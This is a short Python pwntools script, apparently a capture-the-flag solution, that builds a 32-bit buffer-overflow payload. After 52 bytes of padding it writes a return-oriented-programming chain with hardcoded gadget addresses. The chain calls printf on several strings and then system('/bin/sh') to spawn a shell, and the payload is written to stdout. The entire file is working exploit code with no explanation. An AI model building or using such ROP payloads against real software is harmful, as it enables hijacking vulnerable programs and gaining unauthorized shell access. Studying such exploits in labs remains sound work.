from pwn import *
import sys

padding = 52
pop3ret = p32(0x80485b9)
pop4ret = p32(0x80485b8)
printf = p32(0x08048370)
formatstr2 = p32(0xf7f6439e)
formatstr3 = p32(0xf7ff1b38)
ispace = p32(0xf7de4b8c)
did = p32(0xf7ff1d9e)
it = p32(0x804827f)
ex = p32(0x804821c)
space = p32(0x804802a)
system = p32(0x08048390)
popret = p32(0x8048351)
binsh = p32(0xf7f64352)

payload = b''
payload += b'A'*padding
payload += printf
payload += pop4ret
payload += formatstr3
payload += ispace
payload += did
payload += space
payload += printf
payload += pop3ret
payload += formatstr2
payload += it
payload += ex
payload += system
payload += popret
payload += binsh

sys.stdout.buffer.write(payload)
